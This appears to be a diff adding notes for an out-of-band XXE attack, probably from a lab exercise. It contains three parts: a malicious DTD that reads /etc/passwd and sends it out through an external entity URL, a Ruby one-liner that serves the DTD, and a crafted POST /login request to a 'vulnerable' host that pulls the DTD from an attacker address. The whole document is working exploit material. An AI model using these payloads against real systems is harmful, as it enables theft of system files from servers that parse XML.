@@ -1,3 +1,17 @@
+############################1###################################
 <!ENTITY % p1 SYSTEM "file:///etc/passwd">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://127.0.0.1:80/?%p1;'>">
 %p2;
+############################2###################################
+ruby -run -ehttpd . -p3000
+############################3###################################
+POST /login HTTP/1.1
+Host: vulnerable
+Connection: close
+Content-Type: text/xml
+Content-Length: 97
+
+<?xml version="1.0"?>
+<!DOCTYPE foo SYSTEM "http://192.168.159.1:3000/test.dtd">
+<foo>&e1;</foo>
+################################################################
